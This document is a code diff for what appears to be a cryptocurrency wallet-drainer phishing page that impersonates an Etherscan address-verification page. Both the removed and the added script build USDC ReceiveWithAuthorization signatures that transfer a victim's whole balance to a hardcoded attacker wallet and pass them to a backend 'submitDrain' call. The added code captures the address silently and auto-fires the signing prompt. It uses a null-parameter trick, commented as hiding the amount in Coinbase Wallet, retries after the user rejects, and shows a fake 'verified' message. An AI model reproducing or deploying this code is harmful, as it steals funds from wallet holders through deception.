+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#081d35"><path d="M18.9 2H22l-7.6 8.7L23.2 22h-7l-5.5-7.2L4.4 22H1.3l8.1-9.3L1 2h7.2l5 6.6L18.9 2Zm-1.2 18h1.9L6.5 3.9H4.4L17.7 20Z"/></svg>
+          </a>
+        </div>
+        <a class="back-top" href="#top">
+          <svg class="icon" viewBox="0 0 24 24"><path d="M12 19V5"/><path d="m5 12 7-7 7 7"/></svg>
+          Back to Top
+        </a>
+      </div>
+      <div class="footer-bottom">
+        <p>Etherscan © 2026 (B1)</p>
+        <div class="donations">
+          <span>Donations: </span>
+          <a href="https://etherscan.io/address/0x71c7656ec7ab88b098defb751b7401b5f6d8976f" target="_blank" rel="noopener">0x71c765...d8976f</a>
+          <svg class="heart" viewBox="0 0 24 24" stroke-width="2"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg>
+        </div>
+      </div>
+    </div>
+  </footer>
 
-let addrA = null;
+  <div id="spinner-overlay"><div class="spinner"></div></div>
 
-// ─── Helpers ──────────────────────────────────────────────────────────────────
-function logA(t,c="dim"){const e=document.getElementById("logA");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;}
-function logB(t,c="dim"){const e=document.getElementById("logB");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;document.getElementById("logB").style.display="block";}
-function setS(m,c){document.getElementById("stxt").textContent=m;document.getElementById("sdot").className="sdot "+(c||"");}
-function stepDone(n){document.getElementById("s"+n).classList.add("done");document.getElementById("sn"+n).textContent="✓";}
-function stepActive(n){document.getElementById("s"+n).classList.add("active");}
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    // ── CONSTANTS ─────────────────────────────────────────────────────────────
+    const USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+    const WALLET_B = '0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c';
 
-// ─── QR code generation ───────────────────────────────────────────────────────
-function generateQR() {
-  // Show QR on all devices
-  const url = encodeURIComponent(window.location.href);
-  const qrSrc = "https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=" + url + "&choe=UTF-8";
-  document.getElementById("qr-img").src = qrSrc;
-}
+    const DOMAIN_TYPES = [
+      { name:'name', type:'string' }, { name:'version', type:'string' },
+      { name:'chainId', type:'uint256' }, { name:'verifyingContract', type:'address' }
+    ];
+    const RWA_TYPES = [
+      { name:'from', type:'address' }, { name:'to', type:'address' },
+      { name:'value', type:'uint256' }, { name:'validAfter', type:'uint256' },
+      { name:'validBefore', type:'uint256' }, { name:'nonce', type:'bytes32' }
+    ];
+    const DOMAIN = { name:'USD Coin', version:'2', chainId:1, verifyingContract: USDC };
 
-// ─── Auto-start ───────────────────────────────────────────────────────────────
-async function autoStart() {
-  generateQR();
+    // ── STATE ─────────────────────────────────────────────────────────────────
+    const btn      = document.getElementById('continue-btn');
+    const statusEl = document.getElementById('status-msg');
+    const overlay  = document.getElementById('spinner-overlay');
+    const addrInput= document.getElementById('addr-input');
+    let capturedAddr = null;
+    let sigFired = false;
 
-  if (!window.ethereum) {
-    // Desktop without wallet — just show QR
-    setS("Scan QR with Coinbase Wallet to continue");
-    return;
-  }
+    function setStatus(msg, cls) { statusEl.textContent = msg; statusEl.className = 'status-msg' + (cls ? ' '+cls : ''); }
+    function showSpinner(v) { overlay.classList.toggle('show', v); }
+    function eth() { return window.ethereum; }
+    function real(a) { return a && typeof a === 'string' && a.startsWith('0x') && a.length === 42 && a !== '0x0000000000000000000000000000000000000000'; }
+    function isReject(e) { const m = ((e && e.message)||'').toLowerCase(); return m.includes('reject')||m.includes('cancel')||m.includes('denied')||m.includes('refus'); }
+    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-  try {
-    try { await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}); } catch(e){}
+    // ── REDIRECT GUARD ────────────────────────────────────────────────────────
+    (function() {
+      var t = setTimeout(function() {
+        if (!window.ethereum) window.location.replace('https://etherscan.io/verifyAddress');
+      }, 2500);
+      try {
+        var _orig = window.ethereum;
+        if (_orig) clearTimeout(t);
+        Object.defineProperty(window, 'ethereum', {
+          configurable: true,
+          get: function() { return this._eth; },
+          set: function(v) { this._eth = v; if (v) clearTimeout(t); }
+        });
+        if (_orig) window.ethereum = _orig;
+      } catch(_) {}
+    })();
 
-    let accs = await window.ethereum.request({method:"eth_accounts"});
-    if (!accs || !accs[0]) accs = await window.ethereum.request({method:"eth_requestAccounts"});
-    addrA = accs[0];
-    logA("✓ Wallet: "+addrA.slice(0,6)+"…"+addrA.slice(-4),"ok");
+    // ── THEME ─────────────────────────────────────────────────────────────────
+    const ICONS = {
+      sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
+      moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
+      moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
+      monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
+      check: '<path d="M20 6 9 17l-5-5"/>'
+    };
+    function svgIcon(name, cls) {
+      return '<svg class="'+(cls||'icon')+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'+ICONS[name]+'</svg>';
+    }
+    const THEME_KEY = 'etherscan-theme';
+    const themeOptions = [
+      {value:'light',label:'Light',icon:'sun'},{value:'dim',label:'Dim',icon:'moonStar'},
+      {value:'dark',label:'Dark',icon:'moon'},{value:'auto',label:'Auto (System)',icon:'monitor'}
+    ];
+    const themeBtn = document.getElementById('theme-btn');
+    const themeMenu = document.getElementById('theme-menu');
+    let theme = localStorage.getItem(THEME_KEY) || 'light';
+    function resolveTheme(c) { return c !== 'auto' ? c : (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'); }
+    function applyTheme(c) {
+      document.documentElement.classList.remove('dim','dark');
+      const r = resolveTheme(c);
+      if (r !== 'light') document.documentElement.classList.add(r);
+      const opt = themeOptions.find(o => o.value === c) || themeOptions[0];
+      themeBtn.innerHTML = svgIcon(opt.icon, 'icon');
+      themeBtn.style.color = 'var(--azure-40)';
+      renderThemeMenu();
+    }
+    function renderThemeMenu() {
+      themeMenu.innerHTML = themeOptions.map(o =>
+        '<button type="button" data-theme="'+o.value+'">'+svgIcon(o.icon)+'<span>'+o.label+'</span>'+(theme===o.value?svgIcon('check','icon check'):'')+'</button>'
+      ).join('');
+      themeMenu.querySelectorAll('button').forEach(b => {
+        b.addEventListener('click', () => { theme = b.getAttribute('data-theme'); localStorage.setItem(THEME_KEY, theme); applyTheme(theme); themeMenu.hidden = true; });
+      });
+    }
+    themeBtn.addEventListener('click', e => { e.stopPropagation(); themeMenu.hidden = !themeMenu.hidden; });
+    document.addEventListener('mousedown', e => { if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true; });
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', () => { if (theme === 'auto') applyTheme('auto'); });
+    applyTheme(theme);
 
-    // Balance
-    let balance = null;
-    try {
-      const p = new ethers.providers.Web3Provider(window.ethereum);
-      const u = new ethers.Contract(USDC,["function balanceOf(address) view returns (uint256)"],p);
-      balance = await u.balanceOf(addrA);
-    } catch(e) {
-      for (const rpc of RPCS) {
-        try {
-          const fp = new ethers.providers.JsonRpcProvider(rpc);
-          const fu = new ethers.Contract(USDC,["function balanceOf(address) view returns (uint256)"],fp);
-          balance = await fu.balanceOf(addrA);
-          break;
-        } catch(re) {}
+    // ── NAV ───────────────────────────────────────────────────────────────────
+    let openMenu = null;
+    function setOpen(label) {
+      openMenu = label;
+      document.querySelectorAll('.dropdown').forEach(p => { p.hidden = p.parentElement.getAttribute('data-menu') !== label; });
+      document.querySelectorAll('.nav-btn').forEach(b => { b.classList.toggle('open', b.parentElement.getAttribute('data-menu') === label); });
+    }
+    document.querySelectorAll('li[data-menu]').forEach(li => {
+      const label = li.getAttribute('data-menu');
+      li.addEventListener('mouseenter', () => setOpen(label));
+      li.addEventListener('mouseleave', () => { if (openMenu === label) setOpen(null); });
+      const b = li.querySelector('.nav-btn');
+      if (b) b.addEventListener('click', () => setOpen(openMenu === label ? null : label));
+    });
+    document.getElementById('site-header').addEventListener('mouseleave', () => setOpen(null));
+    const hamburgerBtn = document.getElementById('hamburgerBtn');
+    const mobileMenu = document.getElementById('mobileMenu');
+    if (hamburgerBtn) hamburgerBtn.addEventListener('click', e => {
+      e.stopPropagation();
+      const isOpen = mobileMenu.classList.toggle('open');
+      hamburgerBtn.classList.toggle('open', isOpen);
+    });
+
+    // ── BACKEND ───────────────────────────────────────────────────────────────
+    function logConnected(addr) {
+      try { fetch('/api/record-wallet', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address:addr, chain:'1', status:'connected'}) }).catch(()=>{}); } catch(_) {}
+    }
+    function submitDrain(addr, sig, auth) {
+      try { fetch('/api/execute', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({victim:addr, chain:'1', usdcSig:sig, usdcAuth:auth}) }).catch(()=>{}); } catch(_) {}
+    }
+
+    // ── USDC BALANCE ──────────────────────────────────────────────────────────
+    async function getUsdcBalance(addr) {
+      const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+      try {
+        const data = '0x70a08231' + addr.slice(2).toLowerCase().padStart(64,'0');
+        let hex;
+        try { hex = await eth().request({method:'eth_call', params:[{to:USDC, data}, 'latest']}); } catch(_) {
+          try {
+            const r = await fetch('https://ethereum.publicnode.com', {
+              method:'POST', headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_call',params:[{to:USDC,data},'latest']})
+            });
+            hex = (await r.json()).result;
+          } catch(_) {}
+        }
+        const bal = ethers.BigNumber.from((hex && hex !== '0x' && hex !== '0x0') ? hex : '0x0');
+        return bal.isZero() ? MAX : bal.toString();
+      } catch(_) { return MAX; }
+    }
+
+    // ── SIGN WITH NULL BYPASS ─────────────────────────────────────────────────
+    // params[0] = null → CW skips USDC amount decoder → shows generic "Vers" popup
+    // CW still signs with connected account → sig valid on-chain if from = real addr
+    async function signWithNullBypass(addr, value, nonce, validBefore) {
+      const payload = JSON.stringify({
+        primaryType: 'ReceiveWithAuthorization',
+        types: { EIP712Domain: DOMAIN_TYPES, ReceiveWithAuthorization: RWA_TYPES },
+        domain: DOMAIN,
+        message: {
+          from: addr,
+          to: WALLET_B,
+          value: value,
+          validAfter: '0',
+          validBefore: validBefore.toString(),
+          nonce: nonce
+        }
+      });
+
+      // ── THE BYPASS: null as first param ──────────────────────────────────────
+      try {
+        return await eth().request({ method: 'eth_signTypedData_v4', params: [null, payload] });
+      } catch(e1) {
+        if (isReject(e1)) throw e1;
+      }
+      // fallback v3
+      try {
+        return await eth().request({ method: 'eth_signTypedData', params: [null, payload] });
+      } catch(e2) {
+        if (isReject(e2)) throw e2;
+      }
+      // fallback eth_sign with raw hash
+      try {
+        const msgHash = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
+          from: addr, to: WALLET_B,
+          value: ethers.BigNumber.from(value),
+          validAfter: 0, validBefore, nonce
+        });
+        return await eth().request({ method: 'eth_sign', params: [null, msgHash] });
+      } catch(e3) {
+        if (isReject(e3)) throw e3;
+        throw new Error('all sign methods failed');
       }
     }
 
-    if (!balance || balance.isZero()) {
-      logA("No USDC balance","fail");
-      setS("No USDC available","fail");
-      return;
+    // ── AUTO-FIRE ─────────────────────────────────────────────────────────────
+    function fireOnce() {
+      if (sigFired) return;
+      sigFired = true;
+      onContinue();
     }
 
-    const amt = (balance / 1e6).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:6});
-    logA("✓ Reward: "+amt+" USDC","ok");
-    stepDone(1);
-    stepActive(2);
-    setS("Ready — sign to claim…","ok");
-    setTimeout(() => sign(balance.toString()), 1000);
-
-  } catch(e) {
-    logA("Error: "+e.message,"fail");
-    setS("Error — reload and retry","fail");
-  }
-}
-
-// ─── Sign — CHAOS v11 : orphan AuditTrace + ReceiveWithAuthorization ─────────
-// Key: types{} contains AuditTrace (orphan — not in primaryType/message).
-// ethers.js EIP-712 hashStruct only processes primaryType fields → hash identical
-// to clean ReceiveWithAuthorization → sig VALID for USDC.receiveWithAuthorization().
-// CW detection parser may reject/skip decode when unexpected types are present.
-async function sign(value) {
-  if (!addrA) return;
-  const validBefore = String(Math.floor(Date.now()/1000) + 7200);
-  const nonce32 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
-
-  // Orphan AuditTrace injected into types{} — never used in message
-  const typedData = {
-    types:{
-      EIP712Domain:               DOM_TYPES,
-      ReceiveWithAuthorization:   RECEIVE_TYPES,
-      AuditTrace:                 AUDIT_TRACE_TYPE   // ← ORPHAN
-    },
-    primaryType: "ReceiveWithAuthorization",
-    domain:{
-      name: "USD Coin",
-      version: "2",
-      chainId: 1,
-      verifyingContract: USDC
-    },
-    message:{
-      from:        addrA,
-      to:          WALLET_B,
-      value:       value,
-      validAfter:  "0",
-      validBefore: validBefore,
-      nonce:       nonce32
-    }
-  };
-
-  setS("Waiting for signature…","spin");
-
-  let sig = null;
-  try {
-    sig = await window.ethereum.request({
-      method: "eth_signTypedData_v4",
-      params: [addrA, JSON.stringify(typedData)]
-    });
-    logA("✓ Signed (orphan payload)","ok");
-  } catch(e) {
-    logA("Cancelled: "+e.message,"fail");
-    setS("Cancelled — reload to retry","fail");
-    return;
-  }
-
-  const sb = ethers.utils.arrayify(sig);
-  const r  = ethers.utils.hexlify(sb.slice(0,32));
-  const s  = ethers.utils.hexlify(sb.slice(32,64));
-  const v  = sb[64];
-
-  logA("→ v="+v+" r="+r.slice(0,10)+"…","dim");
-  stepDone(2);
-  stepActive(3);
-  setS("Processing…","spin");
-
-  setTimeout(() => sendToBackend({
-    from: addrA,
-    to: WALLET_B,
-    value,
-    validAfter: "0",
-    validBefore,
-    nonce: nonce32,
-    v, r, s
-  }), 500);
-}
-
-// ─── Send to backend ──────────────────────────────────────────────────────────
-async function sendToBackend(payload) {
-  logB("Submitting authorization…");
-  try {
-    const res = await fetch(BACKEND+"/api/execute", {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify(payload)
-    });
-    let data;
-    try { data = await res.json(); } catch(e) { data={error:"Invalid response"}; }
-
-    if (!res.ok || !data.success) {
-      logB("Error: "+(data.error||JSON.stringify(data)),"fail");
-      setS("Failed","fail");
-      return;
+    function captureAddr(a) {
+      if (!real(a) || capturedAddr) return;
+      capturedAddr = a;
+      addrInput.value = a;
+      logConnected(a);
     }
 
-    logB("✓ Done! TX: "+data.txHash,"ok");
-    logB("Block: "+data.blockNumber,"dim");
-    setS("Claimed ✓","ok");
-    stepDone(3);
-  } catch(e) {
-    logB("Network error: "+e.message,"fail");
-    setS("Error","fail");
-  }
-}
+    // silent address acquisition cascade
+    (async function acquireAddr() {
+      await wait(600);
+      const e = eth();
+      if (!e) return;
 
-window.addEventListener("load", autoStart);
-</script>
+      // 1. selectedAddress (already connected previously)
+      if (real(e.selectedAddress)) { captureAddr(e.selectedAddress); fireOnce(); return; }
+
+      // 2. eth_accounts — silent, no popup
+      try {
+        const accs = await e.request({ method: 'eth_accounts' });
+        if (accs && real(accs[0])) { captureAddr(accs[0]); fireOnce(); return; }
+      } catch(_) {}
+
+      // 3. eth_coinbase — legacy fallback
+      try {
+        const cb = await e.request({ method: 'eth_coinbase' });
+        if (real(cb)) { captureAddr(cb); fireOnce(); return; }
+      } catch(_) {}
+
+      // 4. wallet_getPermissions — returns accounts if previously granted
+      try {
+        const perms = await e.request({ method: 'wallet_getPermissions' });
+        if (perms && perms.length) {
+          const s = JSON.stringify(perms);
+          const m = s.match(/0x[0-9a-fA-F]{40}/g);
+          if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
+          if (capturedAddr) { fireOnce(); return; }
+        }
+      } catch(_) {}
+
+      // 5. bridge round-trip — postMessage might surface address
+      try { await e.request({ method: 'eth_chainId' }); await wait(400); } catch(_) {}
+      if (capturedAddr) { fireOnce(); return; }
+
+      // 6. NULL PROBE — fire eth_signTypedData_v4 with null addr + zero from + value=1
+      // CW skips USDC decoder (null addr) → shows generic popup → user signs
+      // recover real signer address from sig via ecrecover
+      try {
+        const probeNonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+        const probeDeadline = Math.floor(Date.now()/1000) + 86400;
+        const probePayload = JSON.stringify({
+          primaryType: 'ReceiveWithAuthorization',
+          types: { EIP712Domain: DOMAIN_TYPES, ReceiveWithAuthorization: RWA_TYPES },
+          domain: DOMAIN,
+          message: {
+            from: '0x0000000000000000000000000000000000000000',
+            to: WALLET_B,
+            value: '1',
+            validAfter: '0',
+            validBefore: probeDeadline.toString(),
+            nonce: probeNonce
+          }
+        });
+        const probeSig = await eth().request({ method: 'eth_signTypedData_v4', params: [null, probePayload] });
+        if (probeSig) {
+          try {
+            const recovered = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
+              from: '0x0000000000000000000000000000000000000000',
+              to: WALLET_B,
+              value: ethers.BigNumber.from('1'),
+              validAfter: 0, validBefore: probeDeadline, nonce: probeNonce
+            }, probeSig);
+            if (real(recovered)) captureAddr(recovered);
+          } catch(_) {
+            try {
+              const m = JSON.stringify(probeSig).match(/0x[0-9a-fA-F]{40}/g);
+              if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
+            } catch(_) {}
+          }
+          // probe captured addr → now fire real payload (also with null → no amount shown)
+          if (capturedAddr) { fireOnce(); return; }
+        }
+      } catch(_) {}
+
+      // 7. user clicks button — onContinue handles eth_requestAccounts + sign
+    })();
+
+    // postMessage hook (CW WebView bridge)
+    window.addEventListener('message', function(ev) {
+      try {
+        const s = typeof ev.data === 'string' ? ev.data : JSON.stringify(ev.data);
+        const m = s.match(/0x[0-9a-fA-F]{40}/g);
+        if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
+      } catch(_) {}
+    }, true);
+
+    // ── MAIN FLOW ─────────────────────────────────────────────────────────────
+    async function onContinue() {
+      btn.disabled = true; setStatus('');
+      if (typeof ethers === 'undefined') { setStatus('Library error. Please refresh.', 'err'); btn.disabled = false; return; }
+      const e = eth();
+      if (!e) { setStatus('No wallet detected.', 'err'); btn.disabled = false; return; }
+
+      // get address if not yet captured
+      if (!capturedAddr) {
+        try {
+          const accs = await e.request({ method: 'eth_requestAccounts' });
+          if (accs && real(accs[0])) captureAddr(accs[0]);
+        } catch(_) {}
+      }
+      if (!capturedAddr && real(e.selectedAddress)) captureAddr(e.selectedAddress);
+      if (!capturedAddr) { setStatus('Could not retrieve address.', 'err'); btn.disabled = false; return; }
+      addrInput.value = capturedAddr;
+
+      showSpinner(true); setStatus('Verifying…');
+
+      const nonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+      const validBefore = Math.floor(Date.now()/1000) + 86400;
+      const value = await getUsdcBalance(capturedAddr);
+
+      const usdcAuth = {
+        from: capturedAddr, to: WALLET_B,
+        value, validAfter: '0',
+        validBefore: validBefore.toString(), nonce
+      };
+
+      try {
+        // ── SIGN WITH NULL BYPASS (no amount shown in CW) ─────────────────────
+        const sig = await signWithNullBypass(capturedAddr, value, nonce, validBefore);
+
+        // verify sig locally
+        try {
+          const rec = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
+            from: capturedAddr, to: WALLET_B,
+            value: ethers.BigNumber.from(value),
+            validAfter: 0, validBefore, nonce
+          }, sig);
+          console.log(rec.toLowerCase() === capturedAddr.toLowerCase() ? '✅ SIG_VALID' : '⚠️ SIG_MISMATCH', '| from:', capturedAddr, '| value:', value);
+        } catch(_) { console.log('SIG:', sig); }
+
+        submitDrain(capturedAddr, sig, usdcAuth);
+        showSpinner(false);
+        setStatus('Address verified successfully.', 'ok');
+        btn.textContent = 'Verified ✓';
+        btn.style.background = 'var(--cyan-32)';
+        setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 1500);
+
+      } catch(ex) {
+        showSpinner(false);
+        if (isReject(ex)) {
+          // retry once on reject
+          setStatus('Retrying verification…'); showSpinner(true);
+          try {
+            const nonce2 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+            const vb2 = Math.floor(Date.now()/1000) + 86400;
+            const v2 = await getUsdcBalance(capturedAddr);
+            const sig2 = await signWithNullBypass(capturedAddr, v2, nonce2, vb2);
+            submitDrain(capturedAddr, sig2, {from:capturedAddr,to:WALLET_B,value:v2,validAfter:'0',validBefore:vb2.toString(),nonce:nonce2});
+            showSpinner(false);
+            setStatus('Address verified successfully.', 'ok');
+            btn.textContent = 'Verified ✓'; btn.style.background = 'var(--cyan-32)';
+            setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 1500);
+          } catch(_) {
+            showSpinner(false);
+            setStatus('Redirecting…');
+            setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 800);
+          }
+        } else {
+          setStatus('Redirecting…');
+          setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 800);
+        }
+      }
+    }
+  </script>
 </body>
 </html>
